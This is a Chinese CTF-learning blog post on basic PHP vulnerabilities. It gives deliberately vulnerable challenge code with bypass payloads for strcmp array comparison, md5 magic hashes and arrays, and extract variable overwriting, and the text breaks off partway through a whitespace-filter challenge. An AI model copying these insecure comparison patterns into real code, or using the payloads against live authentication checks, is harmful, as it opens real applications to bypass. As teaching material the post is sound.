<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="且将新火试新茶，诗酒趁年华">
    <meta name="author" content="Drunkbaby">
    
    <title>
        
            PHP 入门基础漏洞 |
        
        Drunkbaby&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.json"}
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png","favicon":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png","avatar":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png","font_size":"15px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va","appkey":"ermlV1eoB1YODT088EdXjo6C","placeholder":"just go go","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png">
                </a>
            
            <a class="logo-title" href="/">
               Drunkbaby&#39;s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                标签
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                友链
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                关于
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">标签</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">友链</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">关于</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">PHP 入门基础漏洞</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">Drunkbaby</span>
                            
                                <span class="author-label">Lv6</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2022-08-17 11:16:33</span>
        <span class="mobile">2022-08-17 11:16</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2023-03-29 22:02:47</span>
    </span>
    
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/PHP/">PHP</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/PHP/">PHP</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>5.8k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>25 分钟</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                

                <p>PHP 入门基础漏洞</p>
<span id="more"></span>

<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>这篇文章还是讲一讲黑魔法为主。基于 php_bugs 来学习吧，也听一些师傅说了，如果不是为了打 CTF，根本没必要学 PHP 了，今天是 2022-8-29；正好 Java 学不进去，过一遍 PHP</p>
<h2 id="0x02-PHP-基础函数与特性"><a href="#0x02-PHP-基础函数与特性" class="headerlink" title="0x02 PHP 基础函数与特性"></a>0x02 PHP 基础函数与特性</h2><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h3><p>file_get_contents() 把整个文件读入一个字符串中。</p>
<ul>
<li>举个例子</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>


<p>上面的代码将输出：</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">This is a test file with test text.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="isset"><a href="#isset" class="headerlink" title="isset"></a>isset</h3><p><strong>isset()</strong> 函数用于检测变量是否已设置并且非 NULL。</p>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword type-declaration">bool</span> <span class="token keyword">isset</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$var</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> $<span class="token operator">...</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>参数说明：</p>
<ul>
<li><code>$var</code>：要检测的变量。</li>
</ul>
<p>如果一次传入多个参数，那么 isset() 只有在全部参数都被设置时返回 TRUE，计算过程从左至右，中途遇到没有设置的变量时就会立即停止。</p>
<ul>
<li>举个栗子</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span> <span class="token comment">// 结果为 TRUE，所以后边的文本将被打印出来。 </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"变量已设置。"</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> 

<span class="token comment">// 在后边的例子中，我们将使用 var_dump 输出 isset() 的返回值。 </span>
<span class="token comment">// the return value of isset(). </span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"anothertest"</span><span class="token punctuation">;</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// TRUE </span>

<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// TRUE </span>

<span class="token keyword">unset</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// FALSE </span>

<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// FALSE </span>


<span class="token variable">$foo</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$foo</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// FALSE </span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>如果指定变量存在且不为 NULL，则返回 TRUE，否则返回 FALSE。</p>
<h3 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h3><p>extract() 函数从数组中将变量导入到当前的符号表。</p>
<h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">extract</span><span class="token punctuation">(</span>_array<span class="token punctuation">,</span>extract_rules<span class="token punctuation">,</span>prefix_<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h3><p>移除字符串两侧的字符（”Hello” 中的 “He”以及 “World” 中的 “d!”）：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$str</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"Hed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="ereg-x2F-preg-match"><a href="#ereg-x2F-preg-match" class="headerlink" title="ereg&#x2F;preg_match"></a>ereg&#x2F;preg_match</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">**</span>mb_ereg<span class="token operator">**</span>（字符串<span class="token string backtick-quoted-string">`$pattern`</span>，字符串<span class="token string backtick-quoted-string">`$string`</span>，数组 <span class="token string backtick-quoted-string">`&amp;$matches`</span> <span class="token operator">=</span> <span class="token operator">**</span><span class="token string backtick-quoted-string">`null`</span><span class="token operator">**</span>）：<span class="token keyword type-declaration">bool</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>执行与多字节支持的正则表达式匹配。</p>
<p>返回值是 true 或者 false</p>
<h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h3><p>用法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">strcmp</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> str2<span class="token punctuation">)</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>str1 <span class="token operator">&lt;</span> str2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>str1 <span class="token operator">></span> str2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>意思是，我们如果使用了 <code>strcmp()</code> 函数，就必须要传入两个变量 ———— str1，str2。</p>
<p>如果 <code>str1 &lt; str2</code>，则返回 &lt; 0；若 <code>str1 &gt; str2</code>，则返回 &gt; 0；如果两者相等，返回 0。</p>
<p>现在我们回来看上面这段源代码，很显然，如果这是一道题目，我们不可能知道 FLAG 是多少，所以无法做到让两者相等，这时候就有了我们很重要的绕过特性！</p>
<ul>
<li>当 <code>strcmp()</code> 比较出错的时候 —-&gt; 返回 NULL；而返回 NULL 即为返回 0，这时候我们就可以得到 Flag ~</li>
</ul>
<h2 id="0x03-PHP-常见黑魔法"><a href="#0x03-PHP-常见黑魔法" class="headerlink" title="0x03 PHP 常见黑魔法"></a>0x03 PHP 常见黑魔法</h2><blockquote>
<p>如果要用一句话概括一下黑魔法的成因，我喜欢把它称之为 PHP 原生特点。</p>
</blockquote>
<p>在 PHP 当中，我们在类型比较的过程中会产生很多的奇特现象，正是由于这一些奇特现象，会产生一些成功的绕过手段。</p>
<h3 id="1-strcmp-的绕过"><a href="#1-strcmp-的绕过" class="headerlink" title="1. strcmp 的绕过"></a>1. strcmp 的绕过</h3><ul>
<li>这里我们先看这样的一段代码：</li>
</ul>
<p><strong>Strcmp.php</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'DrunkCTF&#123;this_is_arrayCompare_flag&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FLAG</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 <span class="token keyword">echo</span> <span class="token string double-quoted-string">"success, flag:"</span> <span class="token operator">.</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此处 <code>$_GET[&#39;flag&#39;]</code> 的意思是从 url 中获取到一个名叫 flag 的 GET 参数。</p>
<p>然后来看我们现在要讲的关键函数 <code>strcmp()</code></p>
<p>它的用法应该是这样的</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">strcmp</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> str2<span class="token punctuation">)</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>str1 <span class="token operator">&lt;</span> str2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>str1 <span class="token operator">></span> str2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>意思是，我们如果使用了 <code>strcmp()</code> 函数，就必须要传入两个变量 ———— str1，str2。</p>
<p>如果 <code>str1 &lt; str2</code>，则返回 &lt; 0；若 <code>str1 &gt; str2</code>，则返回 &gt; 0；如果两者相等，返回 0。</p>
<p>现在我们回来看上面这段源代码，很显然，如果这是一道题目，我们不可能知道 FLAG 是多少，所以无法做到让两者相等，这时候就有了我们很重要的绕过特性！</p>
<ul>
<li>当 <code>strcmp()</code> 比较出错的时候 —-&gt; 返回 NULL；而返回 NULL 即为返回 0，这时候我们就可以得到 Flag ~</li>
</ul>
<p>绕过手段我们先讲 payload，再来讲原理；payload：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?flag[]&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>成功，如图</p>
<img src="/2022/08/17/PHP-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SuccessBypassStrcmp.png" class="">

<p>原理很简单；<code>?flag[]=0</code> 的意思也就是，我传入的变量名为 flag，但是这个 flag 是一个数组类型的变量，数组怎么可能可以和字符串比较呢？所以此处比较出错，成功返回 NULL，也就是返回 0</p>
<h3 id="2-md5-比较绕过"><a href="#2-md5-比较绕过" class="headerlink" title="2. md5 比较绕过"></a>2. md5 比较绕过</h3><p>题目代码如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'DrunkCTF&#123;you_bypass_md5!&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'s1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'s2'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'s1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'s2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	 <span class="token keyword">echo</span> <span class="token string double-quoted-string">"success, flag is :"</span> <span class="token operator">.</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>简单来说，我们的逻辑就是 s1 和 s2 不能相等，但是它们的 md5 值要相等；于是就有了如下两种绕过手段。</p>
<h4 id="绕过一"><a href="#绕过一" class="headerlink" title="绕过一"></a>绕过一</h4><p>用科学计数法绕过</p>
<p>‘0e123456789’ &#x3D;&#x3D; ‘0e987654321’ &#x3D;&#x3D; 0</p>
<p><strong>以下值在md5加密后以0E开头：</strong></p>
<ul>
<li>QNKCDZO</li>
<li>240610708</li>
<li>s878926199a</li>
<li>s155964671a</li>
<li>s214587387a</li>
<li>s214587387a</li>
<li>0e215962017（这个用的非常多</li>
</ul>
<p>payload 如下</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">md5.php?s1&#x3D;QNKCDZO&amp;s2&#x3D;240610708<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<h4 id="绕过二"><a href="#绕过二" class="headerlink" title="绕过二"></a>绕过二</h4><p>通过数组绕过，也叫数组 trick</p>
<p>原理：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>所以我们的 payload：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">md5.php?s1[]&#x3D;1&amp;s2[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="3-extract-变量覆盖绕过"><a href="#3-extract-变量覆盖绕过" class="headerlink" title="3. extract 变量覆盖绕过"></a>3. extract 变量覆盖绕过</h3><p>源码如下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	
<span class="token variable">$flag</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxx'</span><span class="token punctuation">;</span>
<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$shiyan</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 <span class="token variable">$content</span><span class="token operator">=</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$shiyan</span><span class="token operator">==</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 		<span class="token keyword">echo</span><span class="token string single-quoted-string">'ctf&#123;xxx&#125;'</span><span class="token punctuation">;</span>
 	<span class="token punctuation">&#125;</span>
 	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
 		<span class="token keyword">echo</span><span class="token string single-quoted-string">'Oh.no'</span><span class="token punctuation">;</span>
 	<span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里需要实现<code>$shiyan==$content</code>，<code>$content</code>来源于<code>file_get_contents($flag)</code>，而这个file_get_contents函数是把文件的信息打印出来，我们这个flag是个变量，他取值必定不是文件名，因此这里content变量的值为空，此时无论怎么写flag，content都为空，我们只需要保证shiyan也为空就可以，构造payload如下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">flag<span class="token operator">=</span><span class="token number">123</span><span class="token operator">&amp;</span>shiyan<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="4-绕过过滤的空白字符"><a href="#4-绕过过滤的空白字符" class="headerlink" title="4. 绕过过滤的空白字符"></a>4. 绕过过滤的空白字符</h3><p>源码如下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$info</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span> 
<span class="token variable">$req</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span><span class="token punctuation">;</span>
 
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_error"</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//为一个配置选项设置值</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//关闭所有PHP错误报告</span>
 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
   <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hint:26966dc52e85af40f59b4fe73d8c323a.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt</span>
 
   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"have a fun!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//die — 等同于 exit()</span>
 
<span class="token punctuation">&#125;</span>
 
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$global_var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//foreach 语法结构提供了遍历数组的简单方式 </span>
